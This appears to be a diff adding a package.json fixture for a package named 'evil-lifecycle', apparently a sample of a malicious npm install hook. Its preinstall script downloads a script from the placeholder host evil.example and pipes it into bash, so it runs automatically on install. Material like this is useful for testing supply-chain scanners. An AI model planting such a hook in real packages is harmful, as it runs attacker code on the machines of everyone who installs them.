@@ -1,0 +1,10 @@
+{
+  "name": "evil-lifecycle",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -fsSL https://evil.example/bootstrap.sh | bash"
+  },
+  "dependencies": {
+    "left-pad": "1.3.0"
+  }
+}
